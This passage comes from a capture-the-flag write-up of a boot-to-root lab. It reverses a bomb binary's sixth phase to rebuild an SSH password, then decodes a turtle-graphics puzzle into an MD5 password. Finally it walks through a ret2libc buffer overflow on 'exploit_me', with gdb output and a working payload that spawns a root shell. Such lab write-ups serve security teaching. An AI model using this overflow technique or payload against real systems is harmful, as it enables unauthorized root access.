	- `opekma`
	- `opukma`
	- `opukmq`

Like for the phase 3, we'll have to find the right combination for the final password.

**PHASE 6**:

```
void phase_6(undefined4 param_1)

{
  int *piVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  undefined1 *local_38;
  int *local_34 [6];
  int local_1c [6];
  
  local_38 = node1;
  read_six_numbers(param_1,local_1c);
  iVar4 = 0;
  do {
    iVar2 = iVar4;
    if (5 < local_1c[iVar4] - 1U) {
      explode_bomb();
    }
    while (iVar2 = iVar2 + 1, iVar2 < 6) {
      if (local_1c[iVar4] == local_1c[iVar2]) {
        explode_bomb();
      }
    }
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 0;
  do {
    iVar2 = 1;
    piVar3 = (int *)local_38;
    if (1 < local_1c[iVar4]) {
      do {
        piVar3 = (int *)piVar3[2];
        iVar2 = iVar2 + 1;
      } while (iVar2 < local_1c[iVar4]);
    }
    local_34[iVar4] = piVar3;
    iVar4 = iVar4 + 1;
  } while (iVar4 < 6);
  iVar4 = 1;
  piVar3 = local_34[0];
  do {
    piVar1 = local_34[iVar4];
    piVar3[2] = (int)piVar1;
    iVar4 = iVar4 + 1;
    piVar3 = piVar1;
  } while (iVar4 < 6);
  piVar1[2] = 0;
  iVar4 = 0;
  do {
    if (*local_34[0] < *(int *)local_34[0][2]) {
      explode_bomb();
    }
    local_34[0] = (int *)local_34[0][2];
    iVar4 = iVar4 + 1;
  } while (iVar4 < 5);
  return;
}
```

Once again, digging in Ghidra, we notice 6 variables, from node1 to node6. Then, using gdb we got:

```
(gdb) print (int)node1
$1 = 253
(gdb) print (int)node2
$2 = 725
(gdb) print (int)node3
$3 = 301
(gdb) print (int)node4
$4 = 997
(gdb) print (int)node5
$5 = 212
(gdb) print (int)node6
$6 = 432
```

Recall that the last hint is a '4', meaning that the answer begins with a '4' and that the value of each node are not included in the answer, but their index are.

Intuitively, we can try to order them in descending order (as the fourth node has the biggest value) : `4 2 6 3 1 5`. And it actually works.

**RECAP PHASE 6**:

1. `Public speaking is very easy.`
2. `1 2 6 24 120 720`
3. `1 b 214`
4. `9`
5. `opekmq`
6. `4 2 6 3 1 5`

Thus, the ssh password `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

#### **Step 10 - SSH (thor)**

Connecting with the user `thor` via ssh, we once again have two files at our disposal. A **README** and a file named **turtle**.

The README contains this: 

```
Finish this challenge and use the result as password for 'zaz' user.
```

Turtle contains lines with instructions :

```
Tourne gauche de 90 degrees
Avance 50 spaces
Avance 1 spaces
Tourne gauche de 1 degrees
Avance 1 spaces
[...]
Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
[...]
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces

Can you digest the message? :)
```

The name of the file itself and what it contains are huge hints. The idea here is to convert the file in a python script using the turtle library.

Here's our script:

```
import turtle
t = turtle.Turtle()
t.speed(5) # 1:slowest, 3:slow, 5:normal, 10:fast, 0:fastest
t.forward(100)
t.left(90)
t.forward(50)
i = 0
# 2
while i < 180:
  t.forward(1)
  t.left(1)
  i = i + 1
#363
i = 0
while i < 180:
  t.forward(1)
  t.right(1)
  i += 1
#723
t.forward(50)
#725
t.forward(210)
t.backward(210)
t.right(90)
t.forward(120)
#730
t.right(10)
t.forward(200)
t.right(150)
t.forward(200)
t.backward(100)
t.right(120)
t.forward(50)
#738
t.left(90)
t.forward(50)
#740
i = 0
while i < 180:
  t.forward(1)
  t.left(1)
  i += 1
#1100
i = 0
while i < 180:
  t.forward(1)
  t.right(1)
  i += 1
#1462
t.forward(100)
t.backward(200)
t.forward(100)
t.right(90)
t.forward(100)
t.right(90)
t.forward(100)
t.backward(200)

```
We can test this script on this [website](https://www.codetoday.co.uk/code). It seems that the word we should find is `SLASH`. The issue is that this password is not the right one to connect with `zaz` via ssh. Reading the last lines of turtle once again, we notice the word `digest`, like in `Message Digest Algorithm 5`. The md5 hash of `SLASH` is `646da671ca01bb5d84dbb5fb2238dc8e`. 

#### **Step 11 - SSH (zaz)**

Once connected to zaz via ssh, we discover a directory named `mail` and a binary called `exploit_me`. Unless I am mistaken, the `mail` directory won't be useful this time. Let's have a look at `exploit_me`.

Unfortunately, Ghidra gives us nothing really useful except this:
```
bool main(int param_1,int param_2)

{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```

.Let's focus on gdb.

```
┌──(kali㉿kali)-[~]
└─$ gdb exploit_me
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from exploit_me...
(No debugging symbols found in exploit_me)
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482b4  _init
0x08048300  strcpy@plt
0x08048310  puts@plt
0x08048320  __gmon_start__@plt
0x08048330  __libc_start_main@plt
0x08048340  _start
0x08048370  __do_global_dtors_aux
0x080483d0  frame_dummy
0x080483f4  main
0x08048440  __libc_csu_init
0x080484b0  __libc_csu_fini
0x080484b2  __i686.get_pc_thunk.bx
0x080484c0  __do_global_ctors_aux
0x080484ec  _fini
```

We notice a called to the function `strcpy`. This function is vulnerable to buffer overflow, indeed it takes no parameters specifying the length of the string.

Testing the binary we see that it echoes on the stdin the argument we give.

```
┌──(kali㉿kali)-[~]
└─$ ./exploit_me hello
hello
```

Let's confirm the size of the buffer using python.

```
┌──(kali㉿kali)-[~]
└─$ ./exploit_me `python -c 'print("A"*120)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

┌──(kali㉿kali)-[~]
└─$ ./exploit_me `python -c 'print("A"*140)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./exploit_me `python -c 'print("A"*140)'`

┌──(kali㉿kali)-[~]
└─$ ./exploit_me `python -c 'print("A"*139)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

140 is thus our pivot to exploit the binary. The idea is to trick `exploit_me`, make it print 140 and then give it an address that will point on /bin/sh in order to launch a root shell. This technique is called **ret2libc**. The difference with a basic buffer overflow attack which normally overwrite the return address with the address of a malicious function, is that we overwrite the address of the return function with the address of the `system` libc function. In this case we want the system function to launch `/bin/sh`, more precisely we want `system("/bin/sh")`.

To do so, let's follow some steps.

First, using gdb, we find the address of `system`.

```
zaz@BornToSecHackMe:~$ gdb exploit_me 
(gdb) b main
Breakpoint 1 at 0x80483f7
(gdb) run
Starting program: /home/zaz/exploit_me 
Breakpoint 1, 0x080483f7 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) 
```

The address of system is `0xb7e6b060`.

We should also find the address of `exit` to exit the program once the shell launched.

```
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```
 The address of exit is `0xb7e5ebe0`.
 
 Now we need the address of the string "/bin.sh". To do so let's find the range of address were is located the libc and search for the string.

```
(gdb) info proc map
process 5030
Mapped address spaces:
        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
0xb7f8cc58
1 pattern found.

```
We find the address of "/bin/sh" which is `0xb7f8cc58`.

Let's craft our payload: 

`python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`

We run `exploit_me` with our payload as argument

```
./exploit_me `python -c 'print("A" * 140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7")'`
```
And we are root!

### **Used tools**

1. [**Dogbolt**](https://dogbolt.org/)
2. [**GDB**](https://www.sourceware.org/gdb/documentation/)
3. [**Ghidra**](https://ghidra-sre.org/) 
4. [**Nmap**](https://nmap.org/book/man.html)
5. [**Gobuster**](https://github.com/OJ/gobuster)
6. [**dCode**](https://www.dcode.fr/en)
7. [**URL Encoder**](https://www.url-encode-decode.com/)
8. [**Exploit-db**](https://www.exploit-db.com/)
9. [**Python Turtle**](https://www.codetoday.co.uk/code)
 
### **Resources**

1. [**Web server backdoor**](https://cloudinvent.com/blog/backdoor-webserver-using-mysql-sql-injection/)
2. [**Ret2Libc**](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
3. [**Find using gdb**](https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb)
